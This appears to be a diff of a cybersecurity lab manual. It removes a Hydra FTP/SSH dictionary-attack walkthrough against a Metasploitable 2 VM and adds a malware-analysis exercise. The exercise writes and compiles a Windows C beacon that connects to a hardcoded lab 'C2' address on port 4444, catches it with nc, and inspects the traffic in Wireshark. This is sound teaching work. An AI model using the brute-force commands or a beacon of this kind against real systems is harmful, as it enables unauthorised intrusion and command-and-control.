@@ -1,40 +1,118 @@
-6. ABC Corp, a medium-sized company, is concerned about the security of its network
-and wants to ensure that its employees are using strong passwords. IT security team has
-been tasked with conducting a password strength assessment to identify weak
-passwords that may pose a security risk. The IT security team decides to use a
-password cracking tool, to perform the password strength assessment. Plan is to target
-the company's internal systems, including FTP, SSH. By using Hydra password
-cracking tool perform a password strength assessment, so that ABC Corp's IT sec team
-was able to identify & address weaknesses in their network's authentication.
-Solution: -
-Ensure kali Linux and metaspoiltable VM’s are up and running.
-# Go to Kali linux terminal, Type
-𝑙𝑜𝑐𝑎𝑡𝑒 𝑢𝑛𝑖𝑥_𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑𝑠. 𝑡𝑥𝑡
-It contains dictionary of passwords. Without knowing password, we cannot enter into the target system with
-FTP connection.
-If 𝑢𝑛𝑖𝑥_𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑𝑠. 𝑡𝑥𝑡 does not contain 𝑚𝑠𝑓𝑎𝑑𝑚𝑖𝑛, password of metaspoiltable2 VM, Then type below
-commands
-vi /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
-Then add msfadmin and save the file.
-Hydra tool is used for password cracking. Type the below command in kali linux terminal for cracking the
-password (Dictionary attack), specify the path of 𝑢𝑛𝑖𝑥_𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑. 𝑡𝑥𝑡 and IP address of metaspoiltable2 VM.
-ℎ𝑦𝑑𝑟𝑎 − 𝑙 𝑚𝑠𝑓𝑎𝑑𝑚𝑖𝑛 − 𝑃 /𝑜𝑝𝑡/𝑚𝑒𝑡𝑎𝑠𝑝𝑙𝑜𝑖𝑡 𝑓𝑟𝑎𝑚𝑒𝑤𝑜𝑟𝑘/ 𝑒𝑚𝑏𝑒𝑑𝑑𝑒𝑑 / 𝑓𝑟𝑎𝑚𝑒𝑤𝑜𝑟𝑘/ 𝑑𝑎𝑡𝑎/
-𝑤𝑜𝑟𝑑𝑙𝑖𝑠𝑡𝑠/𝑢𝑛𝑖𝑥_𝑝𝑎𝑠𝑠𝑤𝑜𝑟𝑑𝑠. 𝑡𝑥𝑡 ftp://<Metasploit_IP>
-Now it will match the passwords from the dictionary, once the exact match is found. it will display password
-matched.
-Now get FTP connection to target machine (Metaspoiltable 2) by using below command
-ftp 192.168.62.129
-Then enter username and password of target machine.
-Once you get 𝑓𝑡𝑝 > prompt, it clearly indicates, you got into your target machine.
-Navigate yourself to different path by using below commands
-𝑓𝑡𝑝 > 𝑙𝑠
-𝑓𝑡𝑝 > 𝑐𝑑 𝑣𝑢𝑙𝑛𝑒𝑟𝑎𝑏𝑙𝑒
-𝑓𝑡𝑝 > 𝑐𝑑 𝑡𝑤𝑖𝑘𝑖20030201
-To transfer the file from your target machine to your system.
-𝑓𝑡𝑝 > 𝑔𝑒𝑡 𝑇𝑊𝑖𝑘𝑖20030201. 𝑡𝑎𝑟. 𝑔𝑧
-Similarly, once the password of the target machine is known we can also connect target machine by using
-SSH Connection by using below command.
-ssh -o HostKeyAlgorithms=+ssh-rsa,ssh-dss msfadmin@192.168.1.10
-Type the password. Then you can see the below prompt
-𝑚𝑠𝑓𝑎𝑑𝑚𝑖𝑛@𝑚𝑒𝑡𝑎𝑠𝑝𝑙𝑜𝑖𝑡𝑎𝑏𝑙𝑒: ~$
-Navigate yourself in the target machine to access the files.
+Part A
+Experiment 5: Analyze the captured network traffic from the malware
+execution to identify potential command and control (C2)
+communications or data exfiltration attempts. Extract indicators of
+compromise such as IP addresses or domain names.
+Tool: Wireshark
+
+Tools Used
+ MinGW-w64 (Ubuntu)
+ Wine (Ubuntu)
+ Wireshark (Kali Linux)
+ Netcat (Metasploitable 2)
+
+PART A: Creating sample.exe in Ubuntu VM
+Step 1: Install Required Packages (Ubuntu VM)
+sudo apt update
+sudo apt install mingw-w64 wine
+This installs:
+ MinGW-w64 → to compile .exe
+ Wine → to execute .exe
+
+Step 2: Create Working Directory
+
+mkdir malware_lab
+cd malware_lab
+
+Step 3: Create Source Code File
+vi sample.c
+#include &lt;winsock2.h&gt;
+#include &lt;windows.h&gt;
+int main() {
+WSADATA wsa; /* it stores the information about winsock version
+SOCKET sock;
+struct sockaddr_in server;
+char message[] = &quot;beacon:system_online&quot;;
+WSAStartup(MAKEWORD(2,2), &amp;wsa); /* Initializes winsock library
+sock = socket(AF_INET, SOCK_STREAM, 0); /* Creates a TCP socket
+and it is used for Backdoors, C2 channels
+// Fake C2 server (Metasploitable 2 IP)
+server.sin_addr.s_addr = inet_addr(&quot;192.168.56.101&quot;); /* Converts ip
+address from string to binary format ..you can use metaspoiltable2 vm
+ip
+server.sin_family = AF_INET;
+server.sin_port = htons(4444);
+connect(sock, (struct sockaddr *)&amp;server, sizeof(server));
+
+send(sock, message, sizeof(message), 0);
+closesocket(sock);
+WSACleanup();
+return 0;
+}
+Save and exit.
+
+Step 4: Compile Windows Executable in Ubuntu
+x86_64-w64-mingw32-gcc sample.c -o sample.exe -lws2_32
+
+Step 5: Verify Executable
+file sample.exe
+Expected output:
+PE32+ executable (console) x86-64, for MS Windows
+✔ Confirms successful creation of sample.exe
+
+PART B: Preparing C2 Server (Metasploitable 2)
+
+Step 6: Check IP Address
+ifconfig
+Example:
+
+192.168.56.101
+(This must match the IP hardcoded in sample.c)
+
+Step 7: Start Fake C2 Listener
+nc -lvnp 4444
+This simulates a Command &amp; Control server.
+
+PART C: Capturing Traffic in Kali Linux
+
+Step 8: Start Wireshark (Kali)
+wireshark
+ Select Host-Only network interface
+ Click Start Capture
+
+PART D: Executing sample.exe in Ubuntu VM
+
+Step 10: Execute sample.exe Using Wine
+wine sample.exe
+The program:
+ Runs silently
+ Creates an outbound TCP connection
+
+ Sends a beacon message
+
+PART E: Wireshark Analysis (Kali Linux)
+
+Step 11: Stop Capture
+Save as:
+malware_traffic.pcapng
+
+Step 12: Apply Wireshark Filters
+Show TCP traffic
+tcp
+Show C2 traffic
+ip.addr == 192.168.56.101 &lt;Metaspoiltable-ip&gt;
+Show suspicious port
+tcp.port == 4444
+
+Step 13: Inspect Payload
+1. Right-click packet
+2. Follow → TCP Stream
+Observed payload:
+beacon:system_online
+
+RESULT
+The malware sample generated suspicious outbound network traffic
+indicative of Command and Control (C2) communication, which was
+successfully captured and analyzed using Wireshark.
+Wine was used to execute the Windows executable safely on Ubuntu
+for controlled malware analysis in an isolated environment.
